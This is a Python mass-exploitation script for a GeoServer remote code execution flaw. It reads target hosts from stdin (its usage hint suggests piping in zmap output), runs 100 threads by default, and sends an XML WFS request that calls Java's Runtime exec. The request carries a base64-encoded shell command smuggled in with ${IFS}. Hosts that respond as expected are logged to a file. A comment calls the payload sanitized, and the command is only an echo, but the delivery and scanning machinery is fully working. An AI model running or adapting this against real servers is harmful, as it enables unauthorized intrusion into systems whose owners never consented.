import base64
import requests
import xml.etree.ElementTree as ET
import click
import concurrent.futures
import urllib3
from threading import Lock, Event, Thread
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Locks and sync primitives for thread-safe operations
file_lock = Lock()
stats_lock = Lock()
stop_reporting = Event()

stats = {
    "processed": 0,
    "success": 0,
    "errors": 0,
    "not_vulnerable": 0,
}

class GeoServerExploit:
    def __init__(self, url: str):
        self.url = url
        self.payload_delivered = False

    def construct_command(self):
        # Former payload removed; keep command benign for lab analysis.
        cmd = 'echo "GeoServer lab test: hello from the sanitized script."'  # harmless placeholder
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        bash_command = f"sh -c echo${{IFS}}{cmd_b64}|base64${{IFS}}-d|sh"
        return bash_command

    def fetch_feature_types(self):
        feature_types = []
        try:
            response = requests.get(
                f"{self.url}/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0",
                timeout=10,
                verify=False
            )
            if response.status_code == 200:
                tree = ET.fromstring(response.content)
                namespaces = {"wfs": "http://www.opengis.net/wfs/2.0"}
                feature_types = [
                    elem.text
                    for elem in tree.findall(".//wfs:ReturnFeatureType", namespaces)
                ]
        except Exception:
            pass
        return feature_types

    def execute_exploit(self, object_type):
        command = self.construct_command()
        full_url = f"{self.url}/geoserver/wfs"
        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "*/*",
            "Accept-Language": "en-US;q=0.9,en;q=0.8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
            "Connection": "close",
            "Cache-Control": "max-age=0",
            "Content-Type": "application/xml",
        }
        payload = f"""
            <wfs:GetPropertyValue service='WFS' version='2.0.0'
            xmlns:topp='http://www.openplans.org/topp'
            xmlns:fes='http://www.opengis.net/fes/2.0'
            xmlns:wfs='http://www.opengis.net/wfs/2.0'>
            <wfs:Query typeNames='{object_type}'/>
            <wfs:valueReference>exec(java.lang.Runtime.getRuntime(), "{command}")</wfs:valueReference>
            </wfs:GetPropertyValue>
        """
        try:
            response = requests.post(full_url, headers=headers, data=payload, verify=False, timeout=5)
            if response.status_code == 400 and "NoApplicableCode" in response.text:
                self.payload_delivered = True
                return True
        except Exception:
            pass
        return False

    def run(self):
        feature_types = self.fetch_feature_types()
        for feature_type in feature_types:
            if self.payload_delivered:
                break
            self.execute_exploit(feature_type)

def log_successful_url(url):
    """Log successful URLs to the geo_vuln.txt file."""
    with file_lock:
        with open("geo_vuln.txt", "a") as file:
            file.write(url + "\n")


def record_stats(url, success, error):
    with stats_lock:
        stats["processed"] += 1
        if success:
            stats["success"] += 1
        elif error:
            stats["errors"] += 1
        else:
            stats["not_vulnerable"] += 1

        processed = stats["processed"]
        success_count = stats["success"]
        error_count = stats["errors"]
        not_vuln = stats["not_vulnerable"]

    if success:
        print(f"[+] Success: {url}")
    elif error:
        error_text = str(error)
        print(f"[!] Error: {url} -> {error_text}")

def snapshot_stats():
    with stats_lock:
        return (
            stats["processed"],
            stats["success"],
            stats["errors"],
            stats["not_vulnerable"],
        )


def stats_reporter(stop_event):
    while not stop_event.is_set():
        time.sleep(1)
        processed, success_count, error_count, not_vuln = snapshot_stats()
        if processed == 0:
            continue
        print(f"[stats] processed={processed} success={success_count} errors={error_count} no_vuln={not_vuln}")


def process_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    exploit = GeoServerExploit(url)
    try:
        exploit.run()
        if exploit.payload_delivered:
            log_successful_url(url)
            return url, True, None
        return url, False, None
    except Exception as exc:
        return url, False, exc

@click.command()
@click.option("-w", "--workers", default=100, help="Number of worker threads")
def main(workers):
    stdin_stream = click.get_text_stream("stdin")
    if stdin_stream.isatty():
        raise click.UsageError("Provide addresses via stdin, e.g.: zmap ... | python x86.py -w 100")

    with stats_lock:
        for key in stats:
            stats[key] = 0

    stop_reporting.clear()
    reporter_thread = Thread(target=stats_reporter, args=(stop_reporting,), daemon=True)
    reporter_thread.start()

    futures = set()

    def handle_future(future):
        futures.discard(future)
        url, success, error = future.result()
        record_stats(url, success, error)

    def drain_completed():
        completed = [future for future in list(futures) if future.done()]
        for future in completed:
            handle_future(future)

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        for line in stdin_stream:
            url = line.strip()
            if not url:
                continue
            future = executor.submit(process_url, url)
            futures.add(future)
            drain_completed()

        for future in concurrent.futures.as_completed(list(futures)):
            handle_future(future)

    stop_reporting.set()
    reporter_thread.join()

    processed, success_count, error_count, not_vuln = snapshot_stats()
    print(f"[summary] Processed: {processed} | success: {success_count} | errors: {error_count} | no_vuln: {not_vuln}")

if __name__ == "__main__":
    main()
